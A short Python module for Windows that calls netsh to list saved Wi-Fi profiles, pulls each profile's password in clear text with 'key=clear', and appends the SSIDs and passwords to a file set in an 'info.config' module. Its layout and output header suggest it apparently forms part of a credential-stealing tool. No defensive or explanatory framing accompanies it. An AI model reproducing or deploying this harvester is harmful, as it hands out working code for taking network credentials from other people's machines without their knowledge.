import subprocess
import re
from info.config import WIFI_FILE

def extract_wifi_profiles():
    try:
        command_output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], capture_output=True, text=True
        ).stdout
    except Exception as e:
        return f"Error retrieving profiles: {e}"

    profile_names = re.findall(r"All User Profile\s*:\s(.*)", command_output)
    wifi_data = []

    for name in profile_names:
        profile_info = subprocess.run(
            ["netsh", "wlan", "show", "profile", name], capture_output=True, text=True
        ).stdout
        if "Security key           : Absent" in profile_info:
            continue

        password_info = subprocess.run(
            ["netsh", "wlan", "show", "profile", name, "key=clear"],
            capture_output=True,
            text=True
        ).stdout

        password_match = re.search(r"Key Content\s*:\s(.*)", password_info)
        password = password_match.group(1) if password_match else None

        wifi_data.append({"SSID": name, "Password": password})

    return wifi_data

def save_wifi_data():
    wifi_data = extract_wifi_profiles()
    if isinstance(wifi_data, str):
        # error string
        with open(WIFI_FILE, "a") as f:
            f.write(wifi_data + "\n")
        return

    with open(WIFI_FILE, "a") as f:
        f.write("Wi-Fi Credentials Extracted:\n")
        for entry in wifi_data:
            f.write(f"SSID: {entry['SSID']}\n")
            f.write(f"Password: {entry['Password']}\n\n")
